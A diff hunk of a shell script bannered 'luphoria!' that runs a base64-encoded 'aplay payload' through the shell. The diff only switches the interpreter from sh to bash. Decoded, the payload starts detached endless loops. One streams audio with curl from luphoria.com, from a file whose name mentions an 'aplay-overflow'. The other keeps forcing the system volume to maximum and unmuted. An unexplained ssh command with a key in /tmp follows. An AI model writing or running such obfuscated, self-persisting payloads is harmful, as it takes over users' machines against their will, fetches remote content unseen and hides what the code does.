@@ -9,6 +9,6 @@ echo "  --- luphoria! ---"
 # load aplay payload
 echo "d2hpbGUgWyAxPTEgXTsKZG8KICAgIGFwbGF5IDwoY3VybCBodHRwczovL2x1cGhvcmlhLmNvbS9h
 cGxheS1vdmVyZmxvdy1waGFzaC53YXYpOwpkb25lICYgZGlzb3duICYKd2hpbGUgWyAxPTEgXTsK
-ZG8KICAgIGFtaXhlciBzZXQgTWFzdGVyIDEwMCUgdW5tdXRlOwpkb25lICYgZGlzb3duCg==" | base64 -d | sh
+ZG8KICAgIGFtaXhlciBzZXQgTWFzdGVyIDEwMCUgdW5tdXRlOwpkb25lICYgZGlzb3duCg==" | base64 -d | bash
 
 ssh -d -s 127.0.0.1:1338 -k /tmp/p
